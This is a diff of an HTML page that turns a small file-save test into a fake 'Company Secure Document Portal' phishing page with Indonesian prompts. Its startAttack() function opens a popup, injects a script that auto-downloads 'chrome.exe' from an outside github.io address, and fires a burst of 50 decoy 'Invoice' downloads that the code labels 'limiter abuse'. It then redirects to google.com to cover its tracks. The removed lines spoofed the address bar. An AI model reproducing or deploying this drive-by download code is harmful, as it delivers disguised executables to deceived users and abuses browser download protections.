@@ -1,33 +1,101 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<title>Save Test</title>
+  <title>Secure Document Portal</title>
+  <style>
+    body { font-family: Arial; }
+
+    #overlay {
+      position: fixed;
+      top:0; left:0;
+      width:100%; height:100%;
+      background:white;
+      z-index:9999;
+      display:flex;
+      flex-direction:column;
+      justify-content:center;
+      align-items:center;
+    }
+
+    button {
+      padding:12px 20px;
+      font-size:16px;
+      cursor:pointer;
+    }
+  </style>
 </head>
 <body>
 
-<button id="btn">Start</button>
+<div id="overlay">
+  <h2>Company Secure Document Portal</h2>
+  <p>Klik untuk mengunduh dokumen Anda</p>
+  <button onclick="startAttack()">Download Dokumen</button>
+</div>
 
 <script>
-document.getElementById("btn").onclick = async () => {
+function log(msg){
+  console.log(msg);
+}
 
-  // ubah address bar (tanpa navigasi)
-  history.replaceState({}, "", "/chrome.com");
+function triggerDownloadsBurst(){
+  for (let i = 0; i < 50; i++) {
+    setTimeout(() => {
+      const a = document.createElement('a');
+      a.href = 'data:text/plain;charset=utf-8,file_' + i;
+      a.download = 'Invoice_2026_' + i + '.pdf';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }, i * 40);
+  }
+}
 
-  // buat file rar dummy
-  const data = new Uint8Array([0x52,0x61,0x72,0x21,0x1A,0x07,0x00]);
-  const blob = new Blob([data], {type:"application/x-rar-compressed"});
+function startAttack() {
+  document.getElementById('overlay').innerHTML = "<h3>Memproses permintaan...</h3>";
 
-  const handle = await window.showSaveFilePicker({
-    suggestedName: "chrome.rar"
-  });
+  // 1️⃣ USER GESTURE → buka popup
+  let w = window.open("about:blank", "_blank");
 
-  const writable = await handle.createWritable();
-  await writable.write(blob);
-  await writable.close();
+  // 2️⃣ Inject payload ke popup (kode lama kamu dipertahankan)
+  setTimeout(() => {
+    try {
+      w.document.write(`
+        <h3>Preparing download...</h3>
 
-};
+        <a id="dl" download="chrome.exe"
+        href="https://bangbedul19-del.github.io/bedulsantuy/chrome.exe"></a>
+
+        <script>
+          setTimeout(() => {
+            document.getElementById("dl").click();
+            document.body.insertAdjacentHTML('beforeend','<p>Downloading...</p>');
+          }, 50);
+        <\/script>
+      `);
+
+      log("[2] Payload injected into popup");
+    } catch(e){
+      log("[ERROR] Injection failed: " + e);
+    }
+  }, 500);
+
+  // 3️⃣ Trigger multiple downloads (limiter abuse)
+  setTimeout(() => {
+    triggerDownloadsBurst();
+  }, 1200);
+
+  // 4️⃣ Redirect ke trusted domain (kode lama kamu)
+  setTimeout(() => {
+    try {
+      w.location.href = "https://www.google.com";
+      log("[3] Popup navigated to google.com");
+    } catch (e) {
+      log("[ERROR] Navigation failed: " + e);
+    }
+  }, 2500);
+}
 </script>
 
 </body>
 </html>
+oux-szaq-cxm
